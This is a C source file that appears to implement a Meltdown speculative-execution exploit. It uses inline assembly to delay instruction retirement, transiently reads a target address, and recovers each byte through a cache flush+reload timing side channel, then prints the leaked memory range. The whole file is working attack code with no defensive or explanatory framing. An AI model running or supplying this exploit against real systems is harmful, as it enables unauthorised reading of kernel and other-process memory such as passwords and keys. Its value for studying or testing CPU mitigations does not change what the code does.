#include "header.h"

void meltdown(void* addr, uint32_t* size){

	void* L1;

	printf("\n[*] Leak addr : %p - %p (%d)\n\n", addr, ((void *)(uint64_t)addr + (uint64_t)*size), *size);

	L1 = malloc(PAGE_SIZE * (ARR_SIZE + 2));
	L1 = (char *)((uint64_t)L1 + 0x1000 >> 12 << 12);	
	memset(L1, 0, PAGE_SIZE * ARR_SIZE);

	printf("=========================\n");
	for (uint32_t i=0; i < *size; i++){
		void* target_addr = addr + i;
		printf("%p : %02x\n", target_addr, leak_cache(target_addr, L1));
	}
	printf("=========================\n");
}

uint64_t get_time(void *addr){
	__asm__ __volatile__(
		"rdtscp\n"
		"shl	$32, %rdx\n"
		"or		%rdx, %rax\n"
		"mov	%rax, %rsi\n"
		"mov	(%rdi), %al\n"
		"rdtscp\n"
		"shl	$32, %rdx\n"
		"or		%rdx, %rax\n"
		"sub	%rsi, %rax\n"
	);
}

void trigger_speculative_execution(void *addr, void *L1){
	__asm__ __volatile__(
		"mfence\n"						// +0
		"call delay_commit\n"			// +1
		"movzbl (%rdi),%eax\n"			// +2
		"shl    $0xc,%eax\n"			// +3
		"movzbl (%rsi,%rax,1),%eax\n"	// +4
	);
}

void delay_commit(void){
	__asm__ __volatile__(
		"xorps  %xmm0,%xmm0\n"			// +0
		"sqrtpd %xmm0,%xmm0\n"			// +1
		"sqrtpd %xmm0,%xmm0\n"			// +2
		"sqrtpd %xmm0,%xmm0\n"			// +3
		"sqrtpd %xmm0,%xmm0\n"			// +4
		"movd   %xmm0,%eax\n"			// +5
		"lea    0x10(%rsp,%rax,1),%rsp\n"//+6
		"pop	%rbp\n"					// +7
		"retq\n"						// +
	);
}


uint8_t leak_cache(void* target_addr, void* L1) {
	
	uint64_t deter_table[ARR_SIZE];
	uint32_t res = 0;

	for (uint32_t i=0; i < ARR_SIZE; i++){
		_mm_clflush(L1 + i*PAGE_SIZE);
	}
	// Flush L1 Cache

	syscall(0,0,0,0);
	trigger_speculative_execution(target_addr, L1);
	
	for(uint32_t i=0; i < ARR_SIZE; i++){
		deter_table[i] = get_time(L1 + i * PAGE_SIZE);
	}
	
	for(uint32_t i=0; i < ARR_SIZE; i++){
		if(deter_table[res] > deter_table[i])
			res = i;
	}
	return (uint8_t)res;
}
